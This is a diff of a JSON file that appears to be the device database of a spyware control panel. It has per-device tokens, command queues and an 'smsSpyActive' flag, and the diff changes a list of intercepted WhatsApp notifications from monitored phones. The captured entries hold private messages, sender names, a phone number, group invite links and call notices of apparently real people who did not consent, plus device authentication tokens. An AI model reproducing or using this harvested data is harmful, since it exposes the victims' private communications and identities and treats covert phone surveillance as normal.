@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776782485421,
+    "lastSeen": 1776782488229,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || RULZ STORE KALBAR (15 pesan): +62 815-2218-125",
+        "content": "📷 ‎2 foto",
+        "time": "21/04 21:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776782488308
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (1043 pesan): ~ zunz",
+        "content": "https://chat.whatsapp.com/Ba0Y3axVpZaBj4vaXGHOb9?mode=gi_t  JOIN MAU ADA DAGETTT",
+        "time": "21/04 21:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776782488075
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (160 pesan): ~ jall store",
+        "content": "📷 𝗟𝗢𝗚 𝗚𝗚𝗟 𝗕𝗜𝗡𝗗 𝗢𝗡 𝗔𝗟𝗟 𝗔𝗠𝗔𝗡\n\n𝗦𝗣𝗘𝗞 𝗞𝗔𝗞𝗔𝗦𝗜𝗛 𝗛𝗜𝗧𝗔𝗠 𝗢𝗡 𝗕𝗨𝗡𝗗𝗘𝗟 𝗧𝗨𝗡𝗚 𝗧𝗨𝗡𝗚 𝗢𝗡 𝗘𝗡𝗝𝗘𝗟 𝗣𝗨𝗧𝗜𝗛&𝗨𝗡𝗚𝗨 𝗢𝗡 \n\n𝗢𝗣/𝗛𝗔𝗥𝗚𝗔? 𝟯𝟱+",
+        "time": "21/04 21:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776782487234
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB || VANSS STOREE V¹ (30 pesan): ~ Riko",
@@ -10304,30 +10328,6 @@
         "time": "21/04 21:03",
         "pkg": "com.whatsapp",
         "receivedAt": 1776780205108
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || MANZZ KALBAR (973 pesan): ~ irfan",
-        "content": "need akun ff dana 100k yg ber sg klo ad pm",
-        "time": "21/04 21:03",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780204970
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Faadil Muhammad",
-        "content": "Panggilan telepon berlangsung",
-        "time": "21/04 21:03",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780201301
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Faadil Muhammad",
-        "content": "Panggilan telepon berlangsung",
-        "time": "21/04 21:03",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780201216
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776782485420,
+    "lastSeen": 1776782488206,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
